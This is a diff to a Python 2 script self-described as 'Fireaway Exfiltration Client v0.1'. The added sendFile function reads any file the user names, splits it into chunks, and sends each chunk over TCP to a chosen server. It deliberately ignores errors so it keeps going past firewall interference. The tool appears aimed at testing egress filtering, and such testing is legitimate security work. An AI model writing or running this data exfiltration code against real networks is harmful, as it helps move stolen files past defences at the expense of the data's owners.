@@ -1,5 +1,4 @@
 #!/usr/bin/python
-__author__ = 'Russell Butturini'
 
 import socket
 import sys
@@ -71,8 +70,34 @@ def testChunk(server, port):
         sys.exit()
 
 def sendFile(server, port):
-    print 'SendFile stuff goes here.'
+    fileName = raw_input('Enter path to file to exfiltrate: ')
+    chunkSize = int(raw_input('Enter size of file chunk (use max chunk or less in server output: '))
+    chunkCount = 1
+    with open(fileName,"rb") as in_file:
 
+        if __name__ == '__main__':
+            while True:
+                piece = in_file.read(chunkSize)
+
+                if piece == "":
+                    break #EOF
+
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(15)
+
+                try:
+                    s.connect((server, port))
+                    print 'Sending chunk ' + str(chunkCount)
+                    s.send(piece)
+                    s.close()
+                    chunkCount += 1
+
+                except:
+                    #Handle aggressive network traffic from the firewall and keep going
+                    print 'Got something bad back.  Going to plug on...'
+                    pass
+
+    print 'Finished sending file.  Check ReceivedData.txt on the server for results.'
 
 def printHelp():
     print 'Fireaway Exfiltration Client v0.1'
